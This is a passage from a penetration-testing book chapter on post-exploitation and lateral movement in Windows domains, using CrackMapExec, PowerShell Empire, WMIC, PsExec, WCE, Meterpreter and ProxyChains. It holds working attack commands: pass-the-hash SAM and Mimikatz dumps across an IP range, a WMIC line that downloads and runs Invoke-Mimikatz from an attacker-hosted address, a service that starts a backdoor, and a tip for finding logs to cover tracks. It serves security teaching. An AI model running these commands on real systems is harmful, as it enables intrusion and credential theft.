    <p class="normal"><strong class="keyWord">Databases</strong>: <code class="inlineCode">cmedb</code> is the <a id="_idIndexMarker1250"/>database that stores the host and its credential details, which <a id="_idIndexMarker1251"/>are harvested<a id="_idIndexMarker1252"/> after the exploitation. <em class="italic">Figure 11.12</em> shows a sample of some details:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_12.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.12: cmedb storing the exploited hosts and credentials </p>
    <p class="normal">As an example, we will use the hashdump that we acquired from the compromised system to run the <code class="inlineCode">ipconfig</code> command, as shown in the following code:</p>
    <pre class="programlisting con"><code class="hljs-con">crackmapexec smb &lt;target IP&gt; -u Username -d Domain -H &lt;Hash value&gt; -x ipconfig
</code></pre>
    <p class="normal"><em class="italic">Figure 11.13</em> shows the validity of the credentials by passing the hash successfully and running the <code class="inlineCode">ipconfig</code> command on the target:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_13.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.13: Running command on the target using crackmapexec</p>
    <h1 id="_idParaDest-274" class="heading-1">Horizontal escalation and lateral movement</h1>
    <p class="normal">In horizontal escalation, the<a id="_idIndexMarker1253"/> attacker retains their existing credentials but uses them to act on a different user’s account. For example, a user on compromised system A attacks a user on system B in an attempt to compromise them.</p>
    <p class="normal">The horizontal move that attackers would utilize is from the compromised system. </p>
    <p class="normal">This is used to extract the hashes of common usernames such as Itsupport and LocalAdministrators, or known default user administrators to escalate the privileges horizontally on all the available systems that are connected to the same domain. For example, here, we will use CME to run the same password hashes across an IP range to dump all of the passwords on a hacker-controlled shared drive:</p>
    <pre class="programlisting con"><code class="hljs-con">crackmapexec smb 10.10.10.1/24 -u &lt;Username&gt; -d local -H &lt;Hashvalue&gt; --sam
</code></pre>
    <p class="normal"><em class="italic">Figure 11.14</em> shows the output of a SAM dump being run on an entire IP range to extract SAM password hashes without planting any executables or backdoors:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_14.png" alt=""/> </figure>

    <p class="packt_figref">Figure 11.14: Spraying password hashes across the network IP range</p>
    <p class="normal">In mature <a id="_idIndexMarker1254"/>organizations, there may be a chance that this payload is blocked by endpoint protection or antivirus software, but that does not stop the hashdump if the user is a local administrator.</p>
    <p class="normal">Most of the time, we have been successful in using the same local administrator’s password hash to successfully log in to the domain’s Microsoft <strong class="keyWord">SCCM</strong> (<strong class="keyWord">System Center Configuration Manager</strong>) system. This manages <a id="_idIndexMarker1255"/>software installation on all of the systems that are managed by any organization. It then performs the command and control from SCCM.</p>
    <p class="normal">By running the following <a id="_idIndexMarker1256"/>command, you can run <code class="inlineCode">mimikatz</code> on the desired target with captured username and password hashes:</p>
    <pre class="programlisting con"><code class="hljs-con">crackmapexec smb &lt;target&gt; -u &lt;username&gt; -d &lt;domain or local&gt; -H &lt;Hash value&gt; -M mimikatz
</code></pre>
    <p class="normal"><em class="italic">Figure 11.15</em> shows the output of <code class="inlineCode">mimikatz</code> being run on our victim system to extract passwords in plaintext without uploading any executables or planting any backdoors:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_15.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.15: Running Mimikatz on the target using crackmapexec</p>
    <p class="normal">CME has excellent support so that you can pass the hash and invoke <code class="inlineCode">mimikatz</code> directly from the module or invoke the Empire PowerShell to perform data exfiltration.</p>
    <h2 id="_idParaDest-275" class="heading-2">Compromising domain trusts and shares</h2>
    <p class="normal">In this section, we will discuss the domain hierarchies that can be manipulated so that we can take advantage of the features that are being implemented on Active Directory.</p>
    <p class="normal">We will utilize the <a id="_idIndexMarker1257"/>Empire tool to harvest all of the domain-level information <a id="_idIndexMarker1258"/>and trust relationships between the systems. To understand the current situation of the system that is being compromised, attackers can now perform different types of queries by using the Empire tool. <em class="italic">Table 11.6</em> provides a list of the most effective modules that are typically used during an RTE/pentesting activity:</p>
    <table id="table006-1" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Module Name</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/sharefinder</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">This <a id="_idIndexMarker1259"/>module provides a list of network file shares on the given network.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/arpscan</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Testers can perform an <code class="inlineCode">arpscan</code> to the reachable IP v4 range.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/reverse_dns</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">This module provides the reverse IP lookup and finds the DNS hostname.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/portscan</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Similar to <code class="inlineCode">nmap</code>, you can use this module to perform host scans, but this is not stealthy.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/netview</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">This module helps attackers to enumerate shares, logged-on users, and sessions on a given domain.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/userhunter</code></p>
            <p class="normal"><code class="inlineCode">situational_awareness/network/stealth_userhunter</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Attackers use <code class="inlineCode">userhunter</code> to identify how many more systems they can log into with the acquired credentials. Since this will hunt for the user, its sets are logged into a given network.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/powerview/get_forest</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Successful <a id="_idIndexMarker1260"/>execution of this module will return the forest details.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/get_exploitable_system</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the vulnerable systems on the network, providing an additional entry point.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">situational_awareness/network/powerview/find_localadmin_access get_domain_controller get_forest_domain get_fileserver find_gpo_computer_admin</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">All of these modules are used to harvest more details on the <a id="_idIndexMarker1261"/>domain trusts, objects, and file servers.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref"> Table 11.6: PowerShell Empire modules for situational awareness </p>
    <p class="normal">In this <a id="_idIndexMarker1262"/>example, we will use the <code class="inlineCode">situational_awareness/network/powerview/get_forest</code> module to extract the forest details of a<a id="_idIndexMarker1263"/> connected domain. The following commands are run in the PowerShell Empire terminal. </p>
    <p class="normal">A successful run of the modules should disclose the details that are shown in <em class="italic">Figure 11.16</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_16.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.16: Running PowerShell Empire module to get forest details</p>
    <p class="normal">In another<a id="_idIndexMarker1264"/> example, the attacker will always locate systems that have <code class="inlineCode">ADMIN$</code> and <code class="inlineCode">C$</code> in them so that it can plant a backdoor or gather information. It<a id="_idIndexMarker1265"/> can then use these credentials to run the commands remotely.</p>
    <p class="normal">This can be achieved by using the <code class="inlineCode">situational_awareness/network/powerview/share_finder</code> module, as shown in <em class="italic">Figure 11.17</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_17.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.17: Identifying the shared drives across the Active Directory domain</p>
    <p class="normal">As the <a id="_idIndexMarker1266"/>majority of pentesters do not check what’s inside the<a id="_idIndexMarker1267"/> shared drives, sometimes they are surprised at the mistakes administrators make, such as allowing all the domain users to access the IT shared drives or even users’ home drives left unattended whereby the attackers can loot numerous passwords, without having to exploit a single vulnerability. During multiple red team activities, we have noticed employees storing passwords, including some banking information, in shared drives as plaintext. </p>
    <h2 id="_idParaDest-276" class="heading-2">PsExec, WMIC, and other tools</h2>
    <p class="normal">PsExec is <a id="_idIndexMarker1268"/>Microsoft’s replacement for Telnet and can be downloaded from <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"><span class="url">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</span></a>. </p>
    <p class="normal">Typically, the PsExec module is utilized by attackers to obtain access to and communicate with the remote system on the <a id="_idIndexMarker1269"/>network with valid credentials:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_18.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.18: Gaining remote shell access using PSExec and valid credentials</p>
    <p class="normal">Originally, the executable was designed for system internals to troubleshoot any issues with the framework. The same can now be utilized by running the PsExec Metasploit module and performing remote options. This will open up a shell; testers can either enter their username and password or just pass the hash values, so there is no need to crack the password hashes to gain access to the system. Now, all the lateral movement can be performed if a<a id="_idIndexMarker1270"/> single system is compromised on the network without the need for a password.</p>
    <p class="normal"><em class="italic">Figure 11.19</em> shows the Metasploit module of PsExec with valid credentials:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_19.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.19: Metasploit module options to make use of PsExec with valid credentials</p>
    <h3 id="_idParaDest-277" class="heading-3">WMIC</h3>
    <p class="normal">On newer systems, attackers and penetration testers take advantage of built-in scripting languages, such as the <strong class="keyWord">Windows Management Instrumentation Command Line</strong> (<strong class="keyWord">WMIC</strong>), a <a id="_idIndexMarker1271"/>command-line and scripting interface that is used to simplify access to Windows Management Instrumentation. If the compromised system supports WMIC, several commands can be used to gather information. <em class="italic">Table 11.7</em> provides a brief description of some of the <a id="_idIndexMarker1272"/>commands:</p>
    <table id="table007-1" class="table-container">
      <thead>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic nicconfig get ipaddress,macaddress</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Obtains the IP address and MAC address</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic computersystem get username</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Verifies the account that was compromised</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic netlogin get name, lastlogon</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Determines who used this system last and when they last logged on</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic desktop get screensaversecure, screensavertimeout</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Determines whether the screensavers are password protected and what the timeout is</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic logon get authenticationpackage</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Determines which logon methods are supported</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic process get caption, executablepath,commandline</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies system processes</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic process where name="process_name" call terminate</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Terminates specific processes</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic os get name, servicepackmajorversion</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Determines the system’s operating system</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic product get name, version</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies installed software</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic product where name="name' call uninstall /nointeractive</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Uninstalls or removes defined software packages</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic share get /ALL</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the shares accessible by the user</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmic /node:"machinename" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Starts RDP remotely</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">wmicnteventlog get path, filename,writeable</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Finds <a id="_idIndexMarker1273"/>all of the system event logs and ensures that they can be modified (these are used when it is time to cover your tracks)</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref"> Table 11.7: WMIC commands that can be leveraged by testers to perform horizontal privilege escalation</p>
    <p class="normal">PowerShell<a id="_idIndexMarker1274"/> is a scripting language built on .NET Framework that runs from a console, giving the user access to the Windows filesystem and objects such as the registry. It is installed by default on the Windows 7 operating system and higher versions. PowerShell extends the scripting support and automation offered by WMIC by permitting the use of shell integration and interoperability on both local and remote targets.</p>
    <p class="normal">PowerShell gives testers access to a shell and scripting language on a compromised system. Since it is native to the Windows operating system, its use of commands does not trigger antivirus software. When scripts are run on a remote system, PowerShell does not write to the disk, thus bypassing any antivirus software and whitelisting controls (assuming that the user has permitted the use of PowerShell).</p>
    <p class="normal">PowerShell supports a number of built-in functions that are referred to as cmdlets. One of the advantages of PowerShell is that cmdlets are aliased to common Unix commands, so entering the <code class="inlineCode">ls</code> command will return a typical directory listing, as shown in <em class="italic">Figure 11.20</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_20.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.20: Running Linux commands in Windows PowerShell</p>
    <p class="normal">PowerShell is<a id="_idIndexMarker1275"/> a rich language that’s capable of supporting very complex operations; it is recommended that the user spends time becoming familiar with its use. Some of the simpler commands that can be used immediately following a compromise are <a id="_idIndexMarker1276"/>described in <em class="italic">Table 11.8:</em></p>
    <table id="table008" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Get-Host | Select Version</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the version of PowerShell that’s being used by the victim’s system. Some cmdlets are added or invoked in different versions.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Get-Hotfix</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the installed security patches and system hotfixes.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Get-Acl</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Identifies the group names and usernames.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Get-Process, Get-Service</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Lists the current processes and services.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">gwmi win32_useraccount</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Invokes WMI to list the user accounts.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">Gwmi_win32_group</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Invokes <a id="_idIndexMarker1277"/>WMI to list the SIDs, names, and domain groups.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 11.8: Inbuilt PowerShell commands that can be utilized to perform local system enumeration</p>
    <p class="normal">Penetration testers can use Windows native commands, DLLs, .NET functions, WMI calls, and PowerShell cmdlets together to create PowerShell scripts with the <code class="inlineCode">.ps1</code> extension. One such example of lateral movement using <a id="_idIndexMarker1278"/>WMIC using credentials is when an attacker runs a process on the remote machine to dump a plaintext password from memory. The command to be utilized is as follows:</p>
    <pre class="programlisting con"><code class="hljs-con">wmic /USER:"domain\user" /PASSWORD:"Userpassword" /NODE:10.10.10.4 process call create "powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.12/Invoke-Mimikatz.ps1'); Invoke-MimiKatz -DumpCreds | Out-File C:\\users\\public\\creds.txt
</code></pre>
    <p class="normal">Reconnaissance should also extend to the local network. Since you are working blind, you will need to create a map of live systems and subnets that the compromised host can communicate with. Start by entering <code class="inlineCode">IFCONFIG</code> (Unix-based systems) or <code class="inlineCode">IPCONFIG /ALL</code> (Windows systems) in the shell prompt. This will allow an attacker to determine the following:</p>
    <ul>
      <li class="bulletList">Whether DHCP addressing is enabled.</li>
      <li class="bulletList">The local IP address, which will also identify at least one active subnet.</li>
      <li class="bulletList">The gateway IP address and DNS server address. System administrators usually follow a numbering convention across the network, and if an attacker knows one address, such as gateway server <code class="inlineCode">10.10.10.1</code>, they will ping addresses such as <code class="inlineCode">10.10.10.100</code>, <code class="inlineCode">10.10.10.5</code>, and so on to find additional subnets.</li>
      <li class="bulletList">The domain name that’s used to leverage Active Directory accounts.</li>
    </ul>
    <p class="normal">If the attacking system and the target system are using Windows, the <code class="inlineCode">net view</code> command can be used to enumerate other Windows systems on the network. Attackers use the <code class="inlineCode">netstat -rn</code> command to review the routing table, which may contain static routes to networks or systems of interest.</p>
    <p class="normal">The local network can be scanned using <code class="inlineCode">nmap</code>, which sniffs for ARP broadcasts. In addition, Kali has several tools that can be used for SNMP endpoint analysis, including <code class="inlineCode">nmap</code>, <code class="inlineCode">onesixtyone</code>, and <code class="inlineCode">snmpcheck</code>.</p>
    <p class="normal">Deploying a packet sniffer to map traffic will help you identify hostnames, active subnets, and domain names. If DHCP addressing is not enabled, it will also allow attackers to identify any<a id="_idIndexMarker1279"/> unused, static IP addresses. Kali is preinstalled with Wireshark (a GUI-based packet sniffer), but you can also use <code class="inlineCode">tshark</code> in a post-exploitation script or from the command line, as shown in <em class="italic">Figure 11.21</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_21.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.21: Running tshark to sniff the network and identify the hosts</p>
    <h3 id="_idParaDest-278" class="heading-3">Windows Credentials Editor</h3>
    <p class="normal"><strong class="keyWord">Windows Credentials Editor</strong> (<strong class="keyWord">WCE</strong>) can be<a id="_idIndexMarker1280"/> downloaded from <a href="https://www.ampliasecurity.com/research/windows-credentials-editor/"><span class="url">https://www.ampliasecurity.com/research/windows-credentials-editor/</span></a>.</p>
    <p class="normal">Using the Meterpreter shell, you can upload <code class="inlineCode">wce.exe</code> to the system that has been compromised, as shown in <em class="italic">Figure 11.22</em>. Once the file has been uploaded to the system, run the <code class="inlineCode">shell</code> command in the Meterpreter session; this will grant terminal access to the compromised system. To validate if WCE is successful, run <code class="inlineCode">wce.exe -w</code> to list all of the user’s login sessions, along with a plaintext password:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_22.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.22: Extracting plaintext passwords using WCE on legacy Windows devices</p>
    <p class="normal">Later, these <a id="_idIndexMarker1281"/>credentials can be utilized by the attackers to laterally move into the network, thus utilizing the same credentials on multiple systems. This tool will work only on legacy systems such as Windows XP, 2003, 7, and 2008.</p>
    <p class="normal">Penetration testers can heavily utilize PowerShell’s automated Empire tool to perform attacks that are specific to Active Directory and other domain trust and privilege escalation attacks, which we will explore in <em class="chapterRef">Chapter 12</em>, <em class="italic">Privilege Escalation</em>.</p>
    <h2 id="_idParaDest-279" class="heading-2">Lateral movement using services</h2>
    <p class="normal">What if penetration testers <a id="_idIndexMarker1282"/>encounter a system with no PowerShell to invoke? During such cases, <strong class="keyWord">Service Controls</strong> (<strong class="keyWord">SCs</strong>) will<a id="_idIndexMarker1283"/> be very handy for performing lateral movement in the network for all of the systems that you have access to or systems with anonymous access to the shared folder.</p>
    <p class="normal">The following commands can be run directly from Command Prompt or through the Meterpreter shell: </p>
    <ul>
      <li class="bulletList"><code class="inlineCode">net use \\advanced\c$/user:advanced\username password</code></li>
      <li class="bulletList"><code class="inlineCode">dir \\advanced\c$</code></li>
      <li class="bulletList">Copy the backdoor that’s been created using Shellter or Veil to the shared folder</li>
      <li class="bulletList">Create a service called <code class="inlineCode">backtome</code></li>
      <li class="bulletList"><code class="inlineCode">Sc \\remotehost create backtome binpath="c:\xx\malware.exe"</code></li>
      <li class="bulletList"><code class="inlineCode">Sc remotehost start backtome</code></li>
    </ul>
    <h2 id="_idParaDest-280" class="heading-2">Pivoting and port forwarding</h2>
    <p class="normal">We discussed simple ways to <a id="_idIndexMarker1284"/>port forward the connection in <em class="chapterRef">Chapter 9</em>, <em class="italic">Bypassing Security Controls</em>, by bypassing content filtering and NAC. In this section, we will use Metasploit’s Meterpreter to pivot and port forward on the targets.</p>
    <p class="normal">In Meterpreter, during an active <a id="_idIndexMarker1285"/>session on the target systems, attackers can use the same system to scan the internal network. <em class="italic">Figure 11.23</em> shows a system with two network adapters, <code class="inlineCode">192.168.0.119</code> and <code class="inlineCode">192.168.52.129</code>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_23.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.23: Identifying if the compromised target has two different network adapters</p>
    <p class="normal">However, there is no route for the attacker’s IP to reach the internal IP ranges; penetration testers with the Meterpreter session will be able to add the route of the compromised system by running the post-exploit module autoroute by running <code class="inlineCode">run post/multi/manage/autoroute</code> in Meterpreter, as shown in <em class="italic">Figure 11.24</em>. This module will add a new route from the Kali attack box to the internal network by using the compromised machine as the bridge:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_24.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.24: Adding autoroute to Kali Linux from the compromised target using post-exploitation modules</p>
    <p class="normal">All of the <a id="_idIndexMarker1286"/>traffic from the attacker’s IP to the internal IP range (<code class="inlineCode">192.168.0.52.x</code>) will now be routed through the compromised system (<code class="inlineCode">192.168.0.x</code>).</p>
    <p class="normal">We will now run the Meterpreter session in the background and try to understand what is beyond the IP range, while also making use of the port scanner from Metasploit, but utilizing the following module:</p>
    <pre class="programlisting con"><code class="hljs-con">use auxiliary/scanner/portscan/tcp
</code></pre>
    <p class="normal">To verify that our Kali Linux certainly has the ability to reach the target network, you set RHOSTS as the default gateway IP of the second adapter. This will enable the attackers to find services on the hopping network and devices; a typical move would be to utilize the port scanner in the Metasploit module, as shown in <em class="italic">Figure 11.25</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_25.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.25: Running portscan after adding autoroute to a hopping network</p>
    <h3 id="_idParaDest-281" class="heading-3">Using ProxyChains</h3>
    <p class="normal">Penetration testers who <a id="_idIndexMarker1287"/>want to use <code class="inlineCode">nmap</code> and other tools to scan the hosts beyond the network can utilize the Metasploit module <code class="inlineCode">socks4a</code> by running the following code in the Metasploit <code class="inlineCode">post</code> module:</p>
    <pre class="programlisting con"><code class="hljs-con">msf post(inject_host) &gt; use auxiliary/server/socks4a
msf auxiliary(socks4a) &gt; run
[*] Auxiliary module execution completed
</code></pre>
    <p class="normal">Configure the ProxyChains configuration after running the module by editing <code class="inlineCode">/etc/proxychains.conf</code> and updating the <code class="inlineCode">socks4</code> configuration to port <code class="inlineCode">1080</code> (or the port number you set in the Metasploit module), as shown in <em class="italic">Figure 11.26</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_11_26.png" alt=""/></figure>
    <p class="packt_figref">Figure 11.26: Updating the socks4 configuration to port 1080</p>
    <p class="normal">Now, the attackers will be able to run <code class="inlineCode">nmap</code> directly by running <code class="inlineCode">proxychains nmap -vv -sV 192.168.1.254</code> from the terminal. We have learned how to utilize ProxyChains to perform network scanning to maintain anonymity.</p>
    <h1 id="_idParaDest-282" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we focused on the immediate actions that follow the exploitation of a target system. We reviewed the initial rapid assessment that’s conducted to characterize the server and the local environment. We also learned how to use various post-exploitation tools to locate target files of interest, create user accounts, and perform horizontal escalation to harvest more information that’s specific to other users. We focused on Metasploit’s Meterpreter usage, the PowerShell Empire tool, and CrackMapExec so that we could collect more information to perform lateral movement and privilege attacks. </p>
    <p class="normal">In the next chapter, we will learn how to escalate privileges from that of a normal user to the highest level possible, and also exploit the weaknesses that can be found in an Active Directory environment.</p>
  </div>
</body></html>